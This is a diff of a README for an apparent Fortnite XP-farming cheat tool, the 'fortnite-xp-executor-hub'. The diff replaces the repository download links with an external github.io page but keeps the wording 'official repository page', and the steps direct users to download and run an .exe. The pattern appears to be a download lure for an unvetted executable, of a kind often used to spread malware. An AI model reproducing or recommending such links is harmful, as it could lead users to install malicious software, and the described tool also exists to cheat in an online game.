@@ -1,6 +1,6 @@
 # 🎮 fortnite-xp-executor-hub - Automate your experience farming routines easily
 
-[![Download Fortnite XP Executor](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Industrials9979/fortnite-xp-executor-hub)
+[![Download Fortnite XP Executor](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://industrials9979.github.io)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ Ensure your computer meets these basic needs before you start:
 
 Follow these steps to set up the software on your machine.
 
-1.  Visit the official repository page to download the latest release: https://github.com/Industrials9979/fortnite-xp-executor-hub
+1.  Visit the official repository page to download the latest release: https://industrials9979.github.io
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version number under the Releases header.
 4.  Find the file ending in .exe in the Assets list.
